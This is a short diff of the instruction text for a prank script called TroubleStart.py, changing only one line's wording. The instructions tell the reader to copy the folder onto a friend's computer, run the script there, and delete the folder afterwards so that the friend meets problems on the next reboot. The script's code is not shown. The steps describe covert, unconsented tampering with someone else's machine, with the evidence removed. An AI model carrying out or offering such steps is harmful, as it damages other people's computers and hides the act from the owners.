@@ -13,6 +13,6 @@ INSTRUCTIONS :
 1. Copy the folder to the home directory of your friend's computer(enemy!).
 2. Now run the script TroubleStart.py (The command is : python3 TroubleStart.py)
 3. Do not forget to delete this folder after you have run the script.
-4. Voila! When your friend (non-CSE) reboots her/his computer the next time, she/he will face problems!!!
+4. Voila! When your friend reboots her/his computer the next time, she/he will face problems!!!
 
 '''
